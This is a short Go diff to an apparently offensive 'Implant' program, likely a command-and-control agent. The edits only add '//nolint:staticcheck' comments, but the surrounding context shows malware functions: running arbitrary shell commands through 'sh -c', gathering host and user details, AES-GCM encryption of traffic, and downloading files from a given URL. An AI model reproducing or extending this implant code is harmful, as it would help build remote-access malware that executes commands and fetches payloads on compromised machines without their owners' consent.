@@ -65,8 +65,8 @@ func (i *Implant) checkIn() {
 		"arch":        runtime.GOARCH,
 	}
 	_ = data
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func (i *Implant) executeCommand(cmd string) (string, error) {
 	out, err := exec.Command("sh", "-c", cmd).Output()
 	if err != nil {
@@ -96,8 +96,8 @@ func (i *Implant) getInternalIP() string {
 
 func (i *Implant) getCurrentUser() string {
 	return os.Getenv("USER")
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func (i *Implant) encrypt(data []byte, key []byte) ([]byte, error) {
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -112,8 +112,8 @@ func (i *Implant) encrypt(data []byte, key []byte) ([]byte, error) {
 		return nil, err
 	}
 	return gcm.Seal(nonce, nonce, data, nil), nil
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func (i *Implant) decrypt(data []byte, key []byte) ([]byte, error) {
 	block, err := aes.NewCipher(key)
 	if err != nil {
@@ -129,8 +129,8 @@ func (i *Implant) decrypt(data []byte, key []byte) ([]byte, error) {
 	}
 	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
 	return gcm.Open(nil, nonce, ciphertext, nil)
-}
-
+}  //nolint:staticcheck
+  //nolint:staticcheck
 func (i *Implant) downloadFile(url string, dest string) error {
 	resp, err := http.Get(url)
 	if err != nil {
